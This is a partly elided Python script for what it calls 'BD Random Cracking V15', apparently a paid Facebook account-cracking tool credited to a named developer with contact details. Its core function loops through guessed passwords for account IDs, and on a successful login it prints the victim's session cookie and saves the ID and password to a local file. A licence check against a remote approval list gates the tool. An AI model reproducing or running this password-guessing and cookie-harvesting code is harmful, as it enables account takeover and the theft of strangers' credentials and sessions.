...
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m 𝐃𝐄𝐀𝐓𝐇 𝐂𝐘𝐁𝐄𝐑 𝐀𝐑𝐌𝐘 𝐓𝐄𝐀𝐌 𝐎𝐍 𝐅𝐈𝐑𝐄  \033[0;m                  ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m 𝐁𝐃 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊𝐈𝐍𝐆 V15 \033[0;m                                    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
   \033[35;1m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
   \033[35;1m║➣\033[1;91m DEVOLPER   : 𝐖𝐚𝐡𝐢𝐝 𝐢𝐬𝐥𝐚𝐦 𝐛𝐢𝐬𝐡𝐚𝐥 \33[1;92m║               
   \033[35;1m║➣ FACEBOOK   :  𝐖𝐚𝐡𝐢𝐝 𝐢𝐬𝐥𝐚𝐦 𝐛𝐢𝐬𝐡𝐚𝐥  \33[1;92m║                 
   \033[35;1m║➣\033[1;93m WHATSAPP  :  01613312325       \33[1;92m║
   \033[35;1m║➣\033[1;34m GITHUB     :  𝐗𝟏𝟎-𝐁𝐈𝐒𝐇𝐀𝐋    \33[1;92m║          
   \033[35;1m║➣\033[1;35m TOOLS      :  𝐁𝐃 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊𝐈𝐍𝐆 \33[1;92m ║                 
   \033[35;1m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
""")
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100087096666964');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://m.me/j/AbZQOX5b-cL_Nl_1//');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/@game_changer_team?si=kWNh3z3FHr0WB5Ql');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	kode = input(' ┗━[+] SELECT : ')
	doamin = ' BD Number id cloner [𝐁𝐈𝐒𝐇𝐀𝐋-OK] '
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝐃𝐄𝐀𝐓𝐇 𝐂𝐘𝐁𝐄𝐑 𝐀𝐑𝐌𝐘 𝐓𝐄𝐀𝐌\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [𝐃𝐄𝐀𝐓𝐇 𝐂𝐘𝐁𝐄𝐑 𝐀𝐑𝐌𝐘 𝐓𝐄𝐀𝐌-💥?] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/bishal.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/BishalBoss078/Me.txt/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100087096666964///")
        time.sleep(3.0)        
        os.system("clear")
        print(logo)
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am B.D.H.A ROBOT and my boss is DCA-BISHAL.Sir this tool is paid because 100% ok id just now login\"")
